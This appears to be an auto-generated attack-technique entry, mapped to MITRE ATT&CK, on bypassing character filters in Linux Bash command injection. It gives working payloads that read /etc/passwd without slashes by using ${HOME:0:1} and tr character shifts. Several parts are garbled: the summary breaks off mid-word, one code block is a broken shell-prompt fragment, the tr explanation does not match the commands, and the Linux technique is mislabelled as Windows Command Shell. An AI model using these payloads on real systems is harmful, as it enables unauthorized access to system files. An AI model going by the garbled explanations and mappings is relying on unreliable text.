---
id: 4c55e92b-2208-4e03-a053-17c1d72d15f2
name: Linux Bash Command Injection with Filter Bypass
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:57.221624+00:00'
updated_at: '2023-04-06T03:55:57.244317+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
sub_techniques:
- '[[Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
- '[[Bypass characters filter]]'
- '[[Command Injection]]'
- '[[Filter Bypasses]]'
commands:
- '[[Display contents of /etc/passwd file]]'
- '[[Display contents of /etc/passwd file]]'
- '[[Echo HOME directory]]'
- '[[Translate characters using tr command]]'
- '[[Translate characters using tr command]]'
---

# Linux Bash Command Injection with Filter Bypass

## Summary

Command injection is a type of attack where an attacker injects malicious code into a system command to execute arbitrary commands. In this case, the attacker is bypassing a filter on certain characters to execute arbitrary commands. This technique can be used by an attacker to gain unauthorized ac

## Description

# Description

Command injection is a type of attack where an attacker injects malicious code into a system command to execute arbitrary commands. In this case, the attacker is bypassing a filter on certain characters to execute arbitrary commands. This technique can be used by an attacker to gain unauthorized access to a system or to execute commands with elevated privileges. In Linux Bash, the attacker can bypass the filter by using alternative characters such as single or double quotes, backticks or parentheses. The attack can be executed without the use of backslashes and slashes.

## Requirements

1. Access to a Linux Bash terminal

## Defense

1. Implement input validation and filtering to prevent injection attacks

1. Use parameterized queries to prevent injection attacks

1. Limit the privileges of the user executing the commands

## Objectives

1. Execute arbitrary commands on the target system

1. Gain unauthorized access to the system or execute commands with elevated privileges

# Instructions

1. Execute the following commands in a Linux Bash terminal:

**Code**: [[swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@cr]]

> The first command will display the root directory of the file system. The second command will display the contents of the /etc/passwd file. The third command replaces the exclamation mark with a double quote and the hyphen with a one. The fourth command uses the tr command to replace the exclamation mark with a double quote and the hyphen with a one. The fifth command will display the contents of the /etc/passwd file by using the cat command with the output of the third and fourth commands as arguments.

**Command** ([[Echo HOME directory]]):

```bash
echo ${HOME:0:1}
```

**Command** ([[Display contents of /etc/passwd file]]):

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

**Command** ([[Translate characters using tr command]]):

```bash
echo . | tr '!-0' '"-1'
```

**Command** ([[Translate characters using tr command]]):

```bash
tr '!-0' '"-1' <<< .
```

**Command** ([[Display contents of /etc/passwd file]]):

```bash
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

### Sub-Techniques

- [[Windows Command Shell|T1059.003 - Windows Command Shell]]

## Commands Used

- [[Display contents of /etc/passwd file]]
- [[Display contents of /etc/passwd file]]
- [[Echo HOME directory]]
- [[Translate characters using tr command]]
- [[Translate characters using tr command]]

## Tags

- [[Bypass characters filter]]
- [[Command Injection]]
- [[Filter Bypasses]]
